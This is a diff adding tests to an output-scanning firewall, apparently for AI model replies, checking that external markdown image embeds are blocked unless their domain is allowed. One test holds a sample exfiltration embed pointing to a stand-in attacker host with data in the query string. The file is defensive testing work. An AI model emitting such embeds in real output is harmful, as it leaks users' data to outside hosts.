@@ -47,3 +47,14 @@ def test_scan_output_blocks_protected_terms(firewall):
 
 def test_scan_output_without_protected_terms_lets_it_through(firewall):
     assert firewall.scan_output("Try the code STAFF-7731 at checkout.")["blocked"] is False
+
+
+def test_scan_output_blocks_external_embeds(firewall):
+    result = firewall.scan_output("![](https://evil.example.net/p.png?d=x)")
+    assert result["blocked"] is True and result["rule_id"] == "exfil:embed"
+
+
+def test_scan_output_allows_own_domain_when_declared(firewall):
+    img = "![](https://acmecorp.example/i.png)"
+    assert firewall.scan_output(img)["blocked"] is True
+    assert firewall.scan_output(img, allowed_domains=["acmecorp.example"])["blocked"] is False
